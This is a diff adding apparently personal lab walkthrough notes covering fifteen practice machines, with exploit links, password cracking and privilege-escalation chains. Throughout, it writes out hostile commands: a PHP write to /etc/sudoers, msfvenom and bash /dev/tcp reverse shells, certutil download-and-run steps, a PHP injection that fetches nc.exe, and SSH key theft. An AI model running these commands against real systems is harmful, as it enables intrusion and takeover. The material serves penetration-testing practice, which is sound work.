@@ -1,0 +1,74 @@
+#machine1
+ProFTPD 1.3.5 -> https://github.com/t0kx/exploit-CVE-2015-3306
+#PE
+lighttpd running in root
+echo "<?php echo 'hello';pasthru('echo \'www-data ALL=(root) NOPASSWD: ALL\' >> /etc/sudoers'); ?>" > root.php
+curl -v http://localhost:5000/files/root.php
+OR PHPFusion 9.03.50 -> https://www.exploit-db.com/exploits/49911
+#machine2
+buffer overflow
+#PE
+WinPeas -> Autologon vulnerable -> login via RDP and command as Admin
+#machine3
+path traversal via uftpd 2.10 -> https://www.exploit-db.com/exploits/51000
+kdbx file -> keepas2john -> john rockyou -> keepass -> ssh
+#PE
+splunk on machine RCE -> https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_local_python3.py
+-> python3 script.py --username --password --payload "chmod +s /bin/bash"
+#machine4
+ftp -> get connect.php disclosure
+#PE
+WinPeas -> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<> LPORT=445 -f msi -o reverse_shell.msi
+Certutil -urlcache -f -split http://<>/reverse_shell.msi
+msiexec /quiet /qn /i reverse_shell.msi
+#machine5
+sql injection on 10081 -> https://www.exploit-db.com/exploits/48989
+#PE
+permission -> find / -group adm -readable 2>/dev/null -> /var/log/auth.log
+#machine6
+Unified Remote 3 on system -> RCE -> searchsploit -m 49587
+#PE
+WinPeas -> HiveNightmare -> https://github.com/GossiTheDog/HiveNightmare
+#machine7
+FreeSwitch on 8081 -> RCE -> https://www.exploit-db.com/exploits/47799
+wfuzz -> robots.txt -> Kikchat -> LFI -> https://www.exploit-db.com/exploits/30235 -> forge revshell -> curl -s http://192.168.XX.218/8678576453/rooms/get.php?name=shell.php&ROOM="<php file_put_contents('nc.bat',file_get_contens('http://<> nc.txt'));system('nc.bat');usleep(100000);system('nc.exe -vn <> 9001 -cmd.exe');+?>" 
+#PE
+msfvenom -> reverse shell binary -> upload shell using curl -> execute msf > run execute -f C:/xampplite/htdocs/8678576453/myroom/root.exe 
+#machine9
+nmap -> robots.exe -> /blogengine -> searchsploit
+#PE
+setCreateTokenPrivilege -> https://github.com/hatRiot/token-priv/blob/master/poptoke/poptoke/SeCreateTokenPrivilege.cpp
+#machine10
+nmap mountd 20048 -> showmount -e <host> -> mount -t nfs <ip>/ <new_folder>/ -no lock -> cd <folder> -> ssh key
+ProFTP 1.3.5 vulnerable -> RCE -> https://www.exploit-db.com/exploits/36803
+nc <> 21 ->  cp /home/<>/.ssh/id_rsa to /var/tmp/id_rsa -> chmod 600 id_rsa -> ssh -i id_rsa <user>@<ip> 
+#PE
+Keybase Redirector on machine -> vulnerable path local privilege escalation -> https://www.exploit-db.com/exploits/46044 -> create source.c -> gcc source.c -o exploit -> change env path -> env PATH=.=$PATH /user/bin/keybase-redirector /myfolderexploit
+#machine11
+scan web with big.txt wordlist -> http://<>/database_backup -> information disclosure creds -> ssh <user>@ip "payload" -> in .bash_profile delete row exit command and login via ssh normally
+#PE 
+sudo version vulnerable -> https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
+#machine12
+login on 8006 default creds -> upload php shell -> rev shell
+#PE
+check sudo version -> https://www.exploit-db.com › exploitsLinux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)
+#machine13
+ftp -> backup.xml.txt -> creds
+#PE
+Wing FTP service vulnerable -> https://www.exploit-db.com/exploits/50720 -> edit exploit with print
+on web POST /admin_lua_script.html.... data:command=os.execute('powershell -Encodedcommand "<>")
+#machine14
+php site -> System($GET['cmd']); -> http://192.168.xx.112:8006/?cmd=bash -c "bash -i >%26/dev/tcp/<>/443 0>%261"
+#machine15
+enumeration script in webserver -> disclosure database credentials -> mysql -h <> -u <> -p <> -> exfiltrate username and hash -> hashcat <rockyou> -> ssh
+ 
+
+
+
+
+
+
+
+
+
+ 
